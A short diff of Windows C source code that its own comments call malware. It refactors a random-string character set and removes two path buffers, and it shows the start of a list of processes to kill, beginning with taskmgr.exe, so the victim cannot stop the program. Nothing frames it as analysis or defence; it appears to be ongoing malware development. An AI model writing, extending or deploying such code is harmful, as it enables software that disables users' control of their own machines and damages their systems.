@@ -23,15 +23,12 @@ LPCWSTR lpWarningMSG = {
 //	L"(The Creator of this Malware is not responsible for any harm/damage done using/utilizing this Malware)"
 };
 
-WCHAR szCd[MAX_PATH];
-WCHAR szMfn[MAX_PATH];
-
 const WCHAR szCharSet[] = {
 	L"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 	L"abcdefghijklmnopqrstuvwxyz"
 	L"1234567890"
 };
-const SIZE_T cculCharSet = (sizeof(szCharSet) - 2) / 2;
+const SIZE_T cculCharSet = (sizeof(szCharSet) - sizeof(WCHAR)) / sizeof(WCHAR);
 
 LPCWSTR lpKillProcs[] = {
 	L"taskmgr.exe",
